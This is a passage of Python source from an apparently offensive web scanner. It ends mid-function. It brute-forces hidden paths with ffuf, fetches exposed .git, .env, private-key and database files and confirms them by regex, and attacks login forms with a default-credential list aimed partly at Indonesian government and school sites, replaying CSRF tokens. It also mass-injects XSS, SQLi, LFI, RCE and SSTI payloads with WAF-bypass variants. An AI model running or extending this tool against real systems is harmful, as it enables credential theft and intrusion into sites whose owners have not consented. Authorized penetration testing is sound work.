"""flood — verbatim split from poison.py (no logic changes)."""
import asyncio
import os
import re
import subprocess
import tempfile
import time
from urllib.parse import urlencode, urlparse

from core.external_tools import _find_tool
from core.ui import B, G, N, i, p, w
from modules.wordlists import PROVIDER
from runners.shared import inject_query_payload

from .state import (
    _LFI_MARKERS,
    _RCE_MARKERS,
    _SQL_ERRORS,
    _SSTI_EXPECTED,
    _XSS_TRIGGERS,
    COMMON_CREDS,
    FFUF_CALIBRATION_OVERHEAD,
    POST_FALLBACK_PARAMS,
    POST_MAX_PARAMS,
    POST_MAX_URLS,
    PoisonState,
    _budget_ok,
    _classify_login_attempt,
    _cookie_names,
    _ffuf_timeout,
    _get_header,
    _get_proxy_flag,
    _loc_path,
)
from .wave import _hold_for_backoff

# Phase: Bruteforce

async def _run_ffuf(base_url: str, wordlist: list[str], extension: str,
                    concurrency: int, timeout: int = 45, policy=None,
                    match_codes: str | None = None,
                    filter_codes: str = "404,301,302") -> list[str]:
    """Run ffuf, return discovered paths.

    ffuf never touches AsyncNetworkEngine, so the scan-policy gate has to live
    here: no dispatch once the request budget is spent, and -t is capped to
    what the budget can still afford.
    """
    ffuf_path = _find_tool("ffuf")
    if not ffuf_path:
        return []

    if policy is not None:
        remaining = policy.requests_remaining
        if remaining is not None:
            if remaining <= 0:
                return []
            concurrency = min(concurrency, remaining)
            # Debit the exact wordlist count (+ calibration allowance) and
            # only fuzz what the budget still covers — otherwise ffuf's
            # traffic stays invisible to max_requests. Charged only AFTER we
            # know the tool exists, so a missing ffuf costs no budget.
            affordable = min(len(wordlist),
                             max(0, remaining - FFUF_CALIBRATION_OVERHEAD))
            if affordable <= 0:
                return []
            wordlist = wordlist[:affordable]
            if policy.charge(len(wordlist) + FFUF_CALIBRATION_OVERHEAD,
                             reason=f"ffuf:{urlparse(base_url).netloc}") <= 0:
                return []

    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt") as wl_file:
        for word in wordlist:
            wl_file.write(word + "\n")

    url_parts = urlparse(base_url)
    base = f"{url_parts.scheme}://{url_parts.netloc}"
    ffuf_url = f"{base}/FUZZ{extension}"

    proxy = _get_proxy_flag()
    args = [
        ffuf_path, "-u", ffuf_url, "-w", wl_file.name,
        "-t", str(concurrency), "-ac", "-fc", filter_codes, "-s",
    ]
    if match_codes:
        # K5: the 3xx-only pass targets redirects without touching the main
        # pass's filter (defaults keep historical behavior byte-identical).
        args.extend(["-mc", match_codes])
    if proxy:
        args.extend(["-x", proxy])

    try:
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except TimeoutError:
            proc.kill()
            await proc.wait()
            return []
        except asyncio.CancelledError:
            # Wave deadline hit: ffuf must not outlive max_duration.
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            try:
                await asyncio.wait_for(proc.wait(), timeout=2)
            except Exception:
                pass
            raise
        found = []
        for line in stdout.decode(errors="replace").strip().splitlines():
            line = line.strip()
            if not line:
                continue
            if line.startswith("/"):
                found.append(f"{base}{line}")
            elif line.startswith("http"):
                found.append(line)
            else:
                found.append(f"{base}/{line}")
        return found
    finally:
        os.unlink(wl_file.name)


# Sensitive-file verification (Package 1, bedah 2026-10-14)
#
# ffuf discovers paths; legacy targets leak the crown jewels as FILES
# (.git, .env, backups, dumps). The old pipeline only did add_urls — the
# gold was found, then thrown away before the report. Every rule requires
# BODY EVIDENCE, because soft-404 servers answer 200 + custom page for
# every random path (caught by a per-host random-path baseline probe).

MAX_SENSITIVE_VERIFY = 40   # candidates per wave (1-2 requests each)

# (path_regex, type, title, content_regex, confidence)
# content_regex=None -> binary: size + soft-404 evidence only -> suspected
_SENSITIVE_RULES = [
    (r"\.git/(HEAD|config)$", "git_exposure",
     "Git Repository Metadata Exposed",
     r"ref:\s*refs/heads/|\[core\]", "confirmed"),
    (r"\.git/$", "git_exposure",
     "Git Repository Metadata Exposed",
     r"objects/|HEAD|index", "confirmed"),
    (r"(^|/)id_rsa|\.ssh/(id_|authorized)", "private_key_exposure",
     "SSH Private Key Exposed",
     r"BEGIN [A-Z0-9 ]*PRIVATE KEY", "confirmed"),
    (r"\.(pem|pfx|p12|jks|keystore)$", "cert_key_exposure",
     "Certificate/Key File Exposed",
     r"BEGIN (RSA |OPENSSH |EC |ENCRYPTED )?PRIVATE KEY", "confirmed"),
    (r"\.env$", "env_exposure",
     "Environment File Exposed",
     r"(?m)^[A-Z][A-Z0-9_]{1,40}=.{1,80}\n[A-Z][A-Z0-9_]{1,40}=", "confirmed"),
    (r"phpinfo|(^|/)info\.php$", "phpinfo_disclosure",
     "PHP Info Disclosure",
     r"phpinfo\(\)|PHP Version", "confirmed"),
    (r"\.(sql|sqlite3?|mdb)$", "database_dump",
     "Database Dump Exposed",
     r"INSERT INTO|CREATE TABLE|mysqldump|PostgreSQL database dump", "confirmed"),
    (r"wp-config\.php\.(bak|old|swp|orig|save|copy|~)", "config_backup",
     "WordPress Config Backup Exposed",
     r"DB_NAME|DB_PASSWORD|table_prefix", "confirmed"),
    (r"\.(php|asp|aspx|jsp|cfm|inc|pl|py|rb)\.(bak|old|swp|orig|save|copy|~)$",
     "source_backup", "Source Code Backup Exposed",
     r"<\?php|<%@\s*Page|^\s*import\s+\w+|require(_once)?\s*\(|mysql_connect|new\s+PDO",
     "confirmed"),
    (r"(config|configuration|settings|database|conn|connection|secret|credential)[^/]*\.(txt|dat|ini|yml|yaml|json|xml)$",
     "config_exposure", "Config/Credential File Exposed",
     r"(?i)(password|passwd|secret|api[_-]?key|db_pass|dsn\s*=)", "confirmed"),
    (r"\.DS_Store$", "ds_store_leak", ".DS_Store Exposed",
     r"Bud1", "confirmed"),
    (r"\.(zip|tar|tar\.gz|tgz|rar|7z|sql\.gz|sql\.zip)$", "backup_archive",
     "Backup Archive Exposed",
     None, "suspected"),
]

_DIRLIST_MARKER = re.compile(
    r"<title>\s*Index\s*of|<h1>\s*Index\s*of|Parent Directory</a>", re.IGNORECASE)


async def verify_sensitive_files(state, urls: list) -> int:
    """Fetch + verify high-value file discoveries, report as findings (P1).

    Bounded (MAX_SENSITIVE_VERIFY/wave), budget-gated, backoff-aware,
    wave-deadline-safe (URLs marked before fetch), and soft-404-proof:
    a hit needs body evidence, never just status 200.
    """
    if not urls:
        return 0
    if not _budget_ok(state) or _hold_for_backoff(state, "sensitive-file verify"):
        return 0

    # Prefilter by path rules; dir-shaped URLs also qualify for the listing check
    candidates = []
    seen = set()
    for u in urls:
        if not u or u in seen or u in state._verified_paths:
            continue
        seen.add(u)
        path = urlparse(u).path or "/"
        prio = len(_SENSITIVE_RULES) + 1
        for idx, rule in enumerate(_SENSITIVE_RULES):
            if re.search(rule[0], path, re.IGNORECASE):
                prio = idx
                break
        else:
            # No file rule hit: still a candidate when dir-shaped OR
            # extension-less ("/backup" 301s to "/backup/" — the listing
            # lives behind the redirect, exactly what the K5 pass finds).
            last = (path.rstrip("/") or "/").rsplit("/", 1)[-1]
            if "." in last:
                continue        # e.g. /about.html — a listing is implausible
        candidates.append((prio, u))

    if not candidates:
        return 0
    candidates.sort(key=lambda x: x[0])
    candidates = candidates[:MAX_SENSITIVE_VERIFY]

    import uuid as _uuid
    baselines = {}
    found = 0
    for _, url in candidates:
        # Re-check: a previous candidate's redirect-retry may have just
        # marked the slash form of this URL (live E2E caught this gap).
        if url in state._verified_paths:
            continue
        if state.time_left < 5 or not _budget_ok(state):
            break
        state._verified_paths.add(url)   # mark before fetch: wave deadline safe
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        if base not in baselines:
            probe = f"{base}/verdamt-404-{_uuid.uuid4().hex[:10]}"
            bl = await state.async_engine.ahttp_send(
                probe, timeout=6, state_context=state.session_manager)
            baselines[base] = bl if isinstance(bl, dict) else {}
        r = await state.async_engine.ahttp_send(
            url, timeout=8, state_context=state.session_manager)
        if not isinstance(r, dict):
            continue
        status = r.get("status", 0)
        body = r.get("body") or ""

        # nginx-style dir redirect: /backup -> /backup/ (the listing lives there)
        if status in (301, 302, 307, 308):
            loc = _get_header(r.get("headers"), "location")
            loc_path = urlparse(loc).path if (loc and "://" in loc) else (loc or "")
            if loc_path == (parsed.path.rstrip("/") + "/") and state.time_left >= 5:
                slash_url = url.rstrip("/") + "/"
                r = await state.async_engine.ahttp_send(
                    slash_url, timeout=8,
                    state_context=state.session_manager)
                if not isinstance(r, dict):
                    continue
                # Same listing behind the redirect — if ffuf also discovered
                # the slash form, it must not be re-fetched and re-reported.
                state._verified_paths.add(slash_url)
                status = r.get("status", 0)
                body = r.get("body") or ""

        if status != 200 or not body:
            continue

        # Soft-404 guard: page head identical to the random-path baseline
        bl = baselines.get(base) or {}
        bbody = bl.get("body") or "" if isinstance(bl, dict) else ""
        if bbody and body[:120] == bbody[:120]:
            continue

        path = parsed.path
        for pregex, ftype, title, cmaker, conf in _SENSITIVE_RULES:
            if not re.search(pregex, path, re.IGNORECASE):
                continue
            if cmaker:
                m = re.search(cmaker, body, re.IGNORECASE)
                if not m:
                    break
                snippet = re.sub(r"\s+", " ", m.group(0))[:60]
                state.add_finding({
                    "type": ftype, "title": title, "url": url[:200],
                    "detail": f"Content verified: `{snippet}` ({len(body)} bytes)",
                    "confidence": conf,
                })
                found += 1
            else:
                if len(body) < 20000:
                    break
                state.add_finding({
                    "type": ftype, "title": title, "url": url[:200],
                    "detail": f"Size-only evidence: {len(body)} bytes "
                              "(binary — not fetched further)",
                    "confidence": conf,
                })
                found += 1
            break
        else:
            # No file rule hit — a verified directory listing still counts
            # (user standard: dir listing = MEDIUM)
            if _DIRLIST_MARKER.search(body):
                state.add_finding({
                    "type": "directory_listing",
                    "title": "Directory Listing Enabled",
                    "url": url[:200],
                    "detail": f"Index listing ({len(body)} bytes)",
                    "confidence": "confirmed",
                })
                found += 1

    if found:
        p(f"{G}{found}{N} sensitive file(s)/listing verified")
    return found


# Smart login brute (Package 2, bedah 2026-10-14)
#
# The old block posted {"username","password","submit"} blindly — forms using
# user/pass/email (or ASP.NET __VIEWSTATE) got baseline==attempt, so real
# admin/admin on the other side produced ZERO signal. Now: parse the actual
# form (lxml), replay every hidden field (VIEWSTATE/CSRF), post to the form's
# own action, refresh rotating tokens, cap attempts per URL (lockout safety).

MAX_LOGIN_ATTEMPTS = 60        # lockout safety — raise deliberately if needed
TOKEN_REFRESH_EVERY = 10       # re-fetch rotating CSRF/VIEWSTATE every N tries
_LOGIN_USER_HINT = re.compile(
    r"user|email|login|npwp|nama|account|identifier|nick|akun|member|admin", re.IGNORECASE)

# Legacy/Indo credential pairs on top of COMMON_CREDS; optional drop-in
# file ~/.wordlists/creds.txt ("user:pass" per line) extends both.
_EXTRA_CREDS = [
    ("admin", "12345"), ("admin", "admin12345"), ("admin", "qwerty123"),
    ("admin", "admin@123"), ("administrator", "administrator"),
    ("administrator", "admin123"), ("root", "toor"), ("root", "root123"),
    ("test", "test123"), ("guest", "guest123"), ("user", "user123"),
    ("operator", "operator"), ("operator", "12345"), ("staff", "staff"),
    ("dinas", "dinas"), ("backup", "backup"), ("demo", "demo"),
    ("demo", "demo123"), ("public", "public"), ("info", "info"),
    ("support", "support"), ("manager", "manager"), ("webmaster", "webmaster"),
    ("mysql", "mysql"), ("postgres", "postgres"), ("oracle", "oracle"),
    ("db", "db"), ("dbadmin", "dbadmin"), ("ftp", "ftp"), ("ssh", "ssh"),
    ("wp", "wp"), ("wordpress", "wordpress"), ("default", "default"),
    ("indonesia", "indonesia"), ("bismillah", "bismillah"), ("rahasia", "rahasia"),
    ("rahasia123", "rahasia123"), ("pendidikan", "pendidikan"),
    ("kantor", "kantor"), ("sekolah", "sekolah"), ("desa", "desa"),
]

_CRED_CACHE: list[tuple[str, str]] | None = None


def _cred_list() -> list[tuple[str, str]]:
    """COMMON_CREDS + legacy/Indo pairs + optional ~/.wordlists/creds.txt."""
    global _CRED_CACHE
    if _CRED_CACHE is not None:
        return _CRED_CACHE
    seen = set()
    creds = []
    for user, pw in list(COMMON_CREDS) + _EXTRA_CREDS:
        if (user, pw) not in seen:
            seen.add((user, pw))
            creds.append((user, pw))
    try:
        drop = os.path.expanduser("~/.wordlists/creds.txt")
        if os.path.exists(drop):
            with open(drop, errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#") or ":" not in line:
                        continue
                    u, p = line.split(":", 1)
                    if u and (u, p) not in seen:
                        seen.add((u, p))
                        creds.append((u, p))
    except OSError:
        pass
    _CRED_CACHE = creds
    return creds


_LXML_WARNED = False


def _warn_missing_lxml() -> None:
    """One-shot loud warning when the lxml parser is unavailable.

    The import used to sit inside `except Exception: return None` — a fresh
    env without lxml (requirements.txt drift, caught by CI) silently lost
    the whole login-form brute: form fetch returned None, zero findings,
    zero words. Missing dependencies must be loud, not silent.
    """
    global _LXML_WARNED
    if _LXML_WARNED:
        return
    _LXML_WARNED = True
    w("login-form brute DISABLED — lxml is not installed (pip install lxml)")


async def _fetch_login_form(state, url: str) -> dict | None:
    """Parse the real login form: user/pass fields, hidden inputs, action."""
    r = await state.async_engine.ahttp_send(
        url, timeout=8, state_context=state.session_manager)
    if not isinstance(r, dict):
        return None
    # nginx-style trailing-slash hop (/login -> /login/): the form lives
    # behind the redirect — same lesson the P1 verifier learned. One hop,
    # same host only: credentials never leave the target's own origin.
    if r.get("status", 0) in (301, 302, 307, 308):
        loc = _get_header(r.get("headers"), "location")
        if not loc:
            return None
        from urllib.parse import urljoin as _urljoin
        target = _urljoin(url, loc)
        if urlparse(target).netloc != urlparse(url).netloc:
            return None
        r = await state.async_engine.ahttp_send(
            target, timeout=8, state_context=state.session_manager)
        if not isinstance(r, dict) or r.get("status", 0) != 200:
            return None
        url = target    # action resolution must use the final URL
    elif r.get("status", 0) != 200:
        return None
    body = r.get("body") or ""
    try:
        from lxml import html as lxml_html
    except ImportError:
        _warn_missing_lxml()
        return None
    try:
        doc = lxml_html.fromstring(body)
    except Exception:
        return None
    forms = doc.xpath("//form[.//input[@type='password']]")
    if not forms:
        return None
    form = forms[0]
    pass_field, text_fields, hidden = None, [], {}
    for inp in form.xpath(".//input[@name]"):
        name = inp.get("name")
        t = (inp.get("type") or "text").lower()
        if t == "hidden":
            hidden[name] = inp.get("value") or ""
        elif t == "password" and pass_field is None:
            pass_field = name
        elif t in ("text", "email", "tel", "number"):
            text_fields.append((name, f"{name} {inp.get('placeholder') or ''}"))
    if not pass_field or not text_fields:
        return None
    hinted = [f for f in text_fields if _LOGIN_USER_HINT.search(f[1])]
    user_field = (hinted or text_fields)[0][0]
    from urllib.parse import urljoin
    action = (form.get("action") or "").strip() or url
    action = urljoin(url, action)
    method = (form.get("method") or "POST").upper()
    if method not in ("POST", "GET"):
        method = "POST"
    return {"action": action, "method": method, "user_field": user_field,
            "pass_field": pass_field, "hidden": hidden}


def _form_has_token(hidden: dict) -> bool:
    return any(re.search(r"csrf|token|viewstate|eventvalidation|nonce|authenticity",
                         k, re.IGNORECASE) for k in hidden)


async def _brute_login_form(state, url: str) -> None:
    """Credential brute against the REAL parsed form (Package 2).

    Classification reuses _classify_login_attempt (redirect diff vs the
    failed-login baseline, cookie-name delta, body diff) — only request
    construction changed: real field names, replayed hidden tokens, the
    form's own action URL, token refresh, and an attempt cap (lockout).
    """
    if not _budget_ok(state):
        return
    form = await _fetch_login_form(state, url)
    if not form:
        return
    creds = _cred_list()
    rotating = _form_has_token(form["hidden"])
    cred_headers = dict(state.auth_headers or {})
    if form["method"] == "POST":
        cred_headers["Content-Type"] = "application/x-www-form-urlencoded"

    async def _attempt(username, password):
        payload = dict(form["hidden"])       # replay VIEWSTATE/CSRF tokens
        payload[form["user_field"]] = username
        payload[form["pass_field"]] = password
        if form["method"] == "GET":
            # urlencode sudah module-level; urlunparse lokal cukup (dipakai
            # hanya di cabang ini — import di dalam branch bikin var lokal).
            from urllib.parse import urlunparse
            parts = list(urlparse(form["action"]))
            parts[4] = urlencode(payload)
            return await state.async_engine.ahttp_send(
                urlunparse(parts), timeout=5, state_context=state.session_manager)
        return await state.async_engine.ahttp_send(
            form["action"], method="POST", data=urlencode(payload),
            headers=cred_headers, timeout=5,
            state_context=state.session_manager)

    # Failed-login baseline: status + redirect + cookies + body (the same
    # four signals as before — now sent through the real form, so endpoints
    # with required hidden fields don't reject us before credentials count).
    fail_r = await _attempt("___nonexistent___", "___wrong___")
    if not isinstance(fail_r, dict):
        return
    fail_headers = fail_r.get("headers") or {}
    baseline = {
        "status": fail_r.get("status", 0) or 0,
        "loc_path": _loc_path(_get_header(fail_headers, "location")),
        "cookies": _cookie_names(_get_header(fail_headers, "set-cookie")),
        "body": (fail_r.get("body") or "").lower()[:2000],
    }

    attempts = 0
    for username, password in creds:
        if attempts >= MAX_LOGIN_ATTEMPTS:
            w(f"login brute cap ({MAX_LOGIN_ATTEMPTS}) on {url[:60]} — "
              "stopping (lockout safety)")
            break
        if state.time_left < 3 or not _budget_ok(state):
            break
        if rotating and attempts and attempts % TOKEN_REFRESH_EVERY == 0:
            fresh = await _fetch_login_form(state, url)
            if fresh:
                form = fresh     # closure reads the cell — refreshed tokens apply
        attempts += 1
        r = await _attempt(username, password)
        if not isinstance(r, dict):
            continue
        signal = _classify_login_attempt(
            r.get("status", 0), r.get("headers") or {},
            (r.get("body") or "").lower()[:2000], baseline)
        if not signal:
            continue
        confidence, detail = signal
        state.add_finding({
            "type": "weak_credentials",
            "title": f"Weak Credentials: {username}:{password}",
            "url": url[:200],
            "detail": (f"{detail} | form {form['user_field']}/{form['pass_field']}"
                       f" @ {form['action'][:60]}"),
            "confidence": confidence,
        })
        if confidence == "confirmed":
            state.session_cookies[url] = {"username": username,
                                          "password": password}
        break


# Paket 4 (bedah 2026-10-14): magazine penuh — the old [:8]/[:3] slices
# threw away exactly what leaks gold on legacy stacks.
_BACKUP_EXTS = [
    "~", ".bak", ".old", ".swp", ".save", ".copy", ".orig", ".inc",
    ".sql", ".zip", ".tar", ".gz", ".tgz", ".tar.gz", ".rar", ".7z",
    ".phps", ".env", ".log", ".conf",
]
EXT_PASS_MAX = 24     # backup exts first + provider extras, bounded


def _rot_slice(payloads: list[str], wave: int, n: int = 3) -> list[str]:
    """Rotate the payload slice per wave: wave 1 keeps historical behavior
    (first n), later waves walk through the full generator list — the deep
    bypass variants finally get fired instead of sitting in dead code (PF3)."""
    if not payloads:
        return []
    off = ((wave - 1) * n) % len(payloads)
    return [payloads[(off + i) % len(payloads)] for i in range(n)]


async def phase_bruteforce(state: PoisonState):
    """Aggressive ffuf bruteforce — dirs, auth, extensions."""
    if not state.services:
        return
    if state.time_left < 5 or not _budget_ok(state):
        return
    if _hold_for_backoff(state, "ffuf bruteforce"):
        return

    base_url = state.services[0]["url"]
    concurrency = state.current_concurrency
    ffuf_timeout = _ffuf_timeout(state)
    wl = PROVIDER.get_dir_wordlist(wave=state.wave, limit=3000)

    # Dir bruteforce
    start = time.time()
    dirs = await _run_ffuf(base_url, wl, "", concurrency,
                           timeout=ffuf_timeout, policy=state.policy)
    state.track_latency(start)
    if dirs:
        state.add_urls(dirs)
    discovered = list(dirs or [])

    # K5 (2026-10-14): main -fc 404,301,302 drops redirect-only routes
    # (empiris: demo.testfire.net /admin = 3xx, kelewat pass utama). Separate
    # 3xx pass on a short list; -ac nahan catch-all-redirect noise (word acak
    # tidak muncul pada pass yang sama).
    if (state.time_left >= 5 and _budget_ok(state)
            and not _hold_for_backoff(state, "ffuf 3xx pass")):
        redir_found = await _run_ffuf(
            base_url, PROVIDER.get_dir_wordlist(limit=500), "",
            concurrency // 2, timeout=_ffuf_timeout(state),
            policy=state.policy,
            match_codes="301,302,303,307,308", filter_codes="404")
        discovered.extend(redir_found or [])
        state.add_urls(redir_found)

    # Auth endpoints
    if state.time_left >= 5 and _budget_ok(state):
        auth_found = await _run_ffuf(
            base_url, PROVIDER.get_auth_wordlist(wave=state.wave, limit=500),
            "", concurrency, timeout=ffuf_timeout, policy=state.policy)
        discovered.extend(auth_found or [])
        state.add_urls(auth_found)

    # Extension bruteforce — Paket 4: the old [:8] threw away exactly the
    # extensions that leak gold on legacy stacks. Backup extensions run
    # FIRST, provider extras follow, bounded at EXT_PASS_MAX.
    exts = list(dict.fromkeys(
        _BACKUP_EXTS + PROVIDER.get_extension_wordlist()))[:EXT_PASS_MAX]
    for ext in exts:
        if state.time_left < 5 or not _budget_ok(state):
            break
        if _hold_for_backoff(state, "ffuf extension run"):
            break
        ext_found = await _run_ffuf(base_url, PROVIDER.get_dir_wordlist(limit=100),
                                    ext, concurrency // 2,
                                    timeout=_ffuf_timeout(state), policy=state.policy)
        discovered.extend([u for u in ext_found if u])
        state.add_urls([u for u in ext_found if u])

    # Package 1 (bedah 2026-10-14): verify sensitive-file discoveries BEFORE
    # the slow login brute — legacy targets leak the crown jewels as files
    # (.git/.env/backups), and the old pipeline only did add_urls: gold was
    # found, then thrown away before the report.
    if discovered and state.time_left >= 8:
        start = time.time()
        await verify_sensitive_files(state, discovered)
        state.track_latency(start)

    # Auth bruteforce on discovered login pages — smart form parsing (P2,
    # bedah 2026-10-14): the old block blindly posted username/password/submit,
    # so forms using user/pass/email (or ASP.NET __VIEWSTATE) never got past
    # the server's field parsing — baseline == attempt, ZERO signal even with
    # real admin/admin on the other side.
    login_urls = [u for u in state.scan_urls
                  if any(x in u.lower() for x in ["login", "admin", "auth", "signin"])]
    for url in login_urls[:3]:
        if state.time_left < 5 or not _budget_ok(state):
            break
        if _hold_for_backoff(state, "login brute"):
            break
        start = time.time()
        await _brute_login_form(state, url)
        state.track_latency(start)


# Phase: Param Flood

async def phase_param_flood(state: PoisonState):
    """Massive Arjun param discovery."""
    from modules.extras.arjun import AsyncParamBruteforcer

    urls_to_scan = [u for u in state.get_high_value_targets(10)
                    if u not in state._param_scanned]
    for url in urls_to_scan:
        if state.time_left < 5 or not _budget_ok(state):
            break
        # Mark before the run so a wave that ends mid-scan does not restart it.
        state._param_scanned.add(url)
        bruteforcer = AsyncParamBruteforcer(
            url, state.async_engine,
            concurrency=state.current_concurrency // 2,
            chunk_size=20,
            session_manager=state.session_manager,
        )
        start = time.time()
        discovered = await bruteforcer.run()
        state.track_latency(start)
        if discovered:
            base_path = urlparse(url).path or "/"
            if base_path not in state.params:
                state.params[base_path] = []
            state.params[base_path].extend(discovered)


def _detect_from_response(resp: dict, ptype: str, payload: str,
                          baseline_body: str) -> dict | None:
    """Quick inline detection — mirrors VulnVerifier but batched."""
    body = (resp.get("body") or "") if isinstance(resp, dict) else ""
    status = resp.get("status", 0) if isinstance(resp, dict) else 0
    if not body or status <= 0:
        return None

    if ptype == "xss":
        for t in _XSS_TRIGGERS:
            if re.search(t, body, re.IGNORECASE) and not re.search(t, baseline_body, re.IGNORECASE):
                return {"type": "reflected_xss", "title": "Reflected XSS",
                        "detail": f"Trigger: {t}", "confidence": "suspected"}
    elif ptype == "sqli":
        for ep in _SQL_ERRORS:
            if re.search(ep, body, re.IGNORECASE) and not re.search(ep, baseline_body, re.IGNORECASE):
                return {"type": "sqli_error", "title": "SQL Injection (Error-based)",
                        "detail": f"Error: {ep}", "confidence": "suspected"}
    elif ptype == "lfi":
        for ind in _LFI_MARKERS:
            if re.search(ind, body, re.IGNORECASE) and not re.search(ind, baseline_body, re.IGNORECASE):
                return {"type": "lfi", "title": "Local File Inclusion",
                        "detail": f"Match: {ind}", "confidence": "suspected"}
    elif ptype == "rce":
        for ind in _RCE_MARKERS:
            if re.search(ind, body, re.IGNORECASE) and not re.search(ind, baseline_body, re.IGNORECASE):
                return {"type": "rce", "title": "RCE / Command Injection",
                        "detail": f"Match: {ind}", "confidence": "suspected"}
    elif ptype == "ssti":
        for expected in _SSTI_EXPECTED:
            if expected in body and expected not in baseline_body:
                return {"type": "ssti", "title": "SSTI",
                        "detail": f"Computed: {expected}",
                        "confidence": "suspected"}
    return None


async def _post_payload_pass(state, targets, payload_types, bypass,
                             generate) -> int:
    """Form-body pass — the GET-only flood cannot see reflected POST sinks.

    ONE canary POST per candidate URL; only URLs that echo the canary value
    (the endpoint parses AND reflects form fields) are worth fuzzing, capped
    at POST_MAX_URLS x POST_MAX_PARAMS x types x 3 payloads. Returns the
    number of findings added. Findings are not auto-chained: the chain
    helpers inject via query string, which a POST-only param does not have.
    """
    import uuid

    found = 0
    reflectors = 0
    for url in targets[:POST_MAX_URLS]:
        if state.time_left < 5 or not _budget_ok(state):
            break
        if _hold_for_backoff(state, "POST payload pass"):
            break

        path = urlparse(url).path or "/"
        params = state.params.get(path) or POST_FALLBACK_PARAMS
        canary = "vt" + uuid.uuid4().hex[:10]
        try:
            probe = await state.async_engine.ahttp_send(
                url, method="POST",
                data=urlencode({params[0]: canary}),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=5, state_context=state.session_manager)
        except Exception:
            continue
        if not isinstance(probe, dict):
            continue
        status = probe.get("status", 0)
        probe_body = probe.get("body") or ""
        if status <= 0 or status in (404, 405, 501) or not probe_body:
            continue
        if canary not in probe_body:
            continue           # field not parsed/reflected → POST fuzz = noise
        reflectors += 1

        post_jobs = []
        for param in params[:POST_MAX_PARAMS]:
            for ptype in payload_types:
                for payload in _rot_slice(generate(ptype, bypass=bypass),
                                          state.wave):
                    form = urlencode({param: payload})
                    post_jobs.append(
                        (url, param, ptype, payload, probe_body,
                         lambda _u=url, _f=form: state.async_engine.ahttp_send(
                             _u, method="POST", data=_f,
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=4, bypass=bypass,
                             state_context=state.session_manager)))

        for idx in range(0, len(post_jobs), 50):
            if state.time_left < 3 or not _budget_ok(state):
                break
            batch = post_jobs[idx:idx + 50]
            results = await asyncio.gather(*[j[5]() for j in batch],
                                            return_exceptions=True)
            for k, res in enumerate(results):
                if isinstance(res, Exception) or not isinstance(res, dict):
                    continue
                job_url, job_param, job_ptype, job_payload, baseline, _ = batch[k]
                finding = _detect_from_response(res, job_ptype, job_payload,
                                                baseline)
                if finding:
                    found += 1
                    finding["url"] = job_url[:200]
                    finding["detail"] = f"POST {job_param} | {finding['detail']}"
                    finding["waf"] = "/".join(res.get("waf") or [])
                    state.add_finding(finding)

    if reflectors:
        i(f"POST body pass: {reflectors} reflector(s), {found} hit(s)")
    return found


async def phase_payload_flood(state: PoisonState):
    """Mass injection + inline vulnerability detection with auto-chaining."""
    from modules.scanners.scanner import SmartPayloadGenerator

    if not _budget_ok(state):
        return

    payload_types = ["xss", "sqli", "lfi", "rce", "ssti"]
    bypass = state.wave % 2 == 1
    jobs = []

    # Use high-value targets first
    targets = state.get_high_value_targets(15)

    for url in targets:
        parsed = urlparse(url)
        base_path = parsed.path or "/"
        params_to_test = state.params.get(base_path, [])
        if not params_to_test:
            params_to_test = ["q", "id", "url", "page", "file",
                              "redirect", "cmd", "search", "debug", "action"]

        for param in params_to_test[:5]:
            for ptype in payload_types:
                # Paket 4: rotate the slice per wave — [:3] forever meant the
                # 34-49-deep bypass lists were dead code (audit PF3).
                for payload in _rot_slice(
                        SmartPayloadGenerator.generate(ptype, bypass=bypass),
                        state.wave):
                    target = inject_query_payload(url, param, payload)
                    jobs.append((url, param, ptype, payload,
                                 lambda _t=target: state.async_engine.ahttp_send(
                                     _t, timeout=4, bypass=bypass,
                                     state_context=state.session_manager)))

    if not jobs:
        return

    total = len(jobs)
    found = 0
    i(f"[Wave {state.wave}] Payload Flood: {B}{total}{N} ({'bypass' if bypass else 'raw'}) + detection")

    # Get baseline per unique URL — PARALLEL with bounded concurrency.
    # A sequential loop here (the original shape) scales to unique_urls x 6s
    # timeout per wave; gather + Semaphore(20) keeps it to a few rounds.
    url_baselines = {}
    unique_urls = list(dict.fromkeys(j[0] for j in jobs))[:100]

    async def _fetch_baseline(u, sem):
        async with sem:
            try:
                start = time.time()
                br = await state.async_engine.ahttp_send(
                    u, timeout=6, state_context=state.session_manager)
                state.track_latency(start)
                return u, (br.get("body") or "") if isinstance(br, dict) else ""
            except Exception:
                return u, ""

    if unique_urls and state.time_left > 10:
        _bsem = asyncio.Semaphore(20)
        for res in await asyncio.gather(
                *[_fetch_baseline(u, _bsem) for u in unique_urls],
                return_exceptions=True):
            if isinstance(res, tuple):
                url_baselines[res[0]] = res[1]
        # Cache only non-empty bodies: a transient fetch failure ("") must
        # not wipe a good baseline captured in an earlier wave.
        state._url_baselines.update(
            {k: v for k, v in url_baselines.items() if v})
    else:
        # Wave almost over — reuse baselines from earlier waves instead of
        # emptying them (an empty baseline makes every guarded marker fire).
        url_baselines = {u: state._url_baselines.get(u, "")
                         for u in unique_urls}

    # Collect auto-chain targets (don't block the batch loop)
    auto_chain_targets = {"sqli": [], "lfi": []}

    batch_size = 200
    for idx in range(0, total, batch_size):
        if state.time_left < 5:
            break
        batch = jobs[idx:idx + batch_size]

        # Fire batch
        tasks = [j[4]() for j in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Detect from results
        for res_idx, result in enumerate(results):
            if isinstance(result, Exception) or result is None:
                continue
            url, param, ptype, payload, _ = batch[res_idx]
            baseline = url_baselines.get(url, "")
            if not baseline:
                # No baseline for this URL (new URL, fetch failed, and no
                # cached copy) — guarded markers would fire on ordinary
                # pages. Skip rather than fabricate a finding.
                continue
            finding = _detect_from_response(result, ptype, payload, baseline)
            if finding:
                finding["url"] = url[:200]
                finding["detail"] = f"Param: {param} | {finding['detail']}"
                finding["waf"] = "/".join(result.get("waf", [])) if isinstance(result, dict) else ""
                state.add_finding(finding)
                found += 1

                # Queue auto-chain targets (don't block batch)
                if ptype == "sqli":
                    auto_chain_targets["sqli"].append((url, param))
                elif ptype == "lfi":
